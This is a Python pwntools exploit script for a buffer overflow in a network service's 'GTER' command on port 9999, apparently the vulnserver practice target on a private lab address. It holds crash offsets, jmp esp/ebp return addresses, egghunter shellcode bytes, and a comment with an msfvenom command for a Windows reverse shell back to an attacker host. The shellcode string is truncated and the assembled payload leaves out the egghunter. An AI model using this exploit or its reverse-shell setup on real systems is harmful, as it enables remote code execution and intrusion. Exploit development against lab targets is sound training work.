#!/usr/bin/python3

# ============================================
# Title of exploit
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"GTER /.:/"  # this should cause the crash
crash = 2000  # a payload of this size triggers the crash
offset = 147
ebpoffset = 143
# jmp ebp location in little endian, because somehow jmp esp doesnt work
jmpebp = p32(0x625011f9)
jmpesp = p32(0x625011af)

# 32 byte egghunter - egg w00t
egghunter = (
    b"\xcc"  # breakpoint
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)
# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("be3c4638")

payload = b"".join([
    vulncmd,
    b"\xcc" * (ebpoffset),
    jmpesp,
    jmpebp
])

payload += b"C" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[*] Payload sent!")
s.close()
